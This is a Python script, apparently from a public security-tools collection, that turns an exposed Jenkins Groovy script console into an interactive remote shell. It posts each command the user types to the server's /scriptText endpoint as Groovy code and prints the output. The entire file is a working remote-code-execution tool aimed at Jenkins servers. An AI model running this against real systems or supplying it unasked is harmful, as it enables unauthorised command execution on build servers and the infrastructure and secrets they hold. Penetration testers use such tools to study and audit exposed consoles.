#!/usr/bin/env python
# SRC: https://raw.githubusercontent.com/bl4de/security-tools/master/jgc.py
# DOC: https://medium.com/@_bl4de/remote-code-execution-with-groovy-console-in-jenkins-bd6ef55c285b
from __future__ import print_function
from builtins import input
import requests
import sys

print("""
Jenkins Groovy Console cmd runner.

usage: ./jgc.py [HOST]

Then type any command and wait for STDOUT output from remote machine.
Type 'exit' to exit :)
""")
URL = sys.argv[1] + '/scriptText'
HEADERS = {
    'User-Agent': 'jgc'
}

while 1:
    CMD = input(">> Enter command to execute (or type 'exit' to exit): ")
    if CMD == 'exit':
        print("exiting...\n")
        exit(0)

    DATA = {
        'script': 'println "{}".execute().text'.format(CMD)
    }
    result = requests.post(URL, headers=HEADERS, data=DATA)
    print(result.text)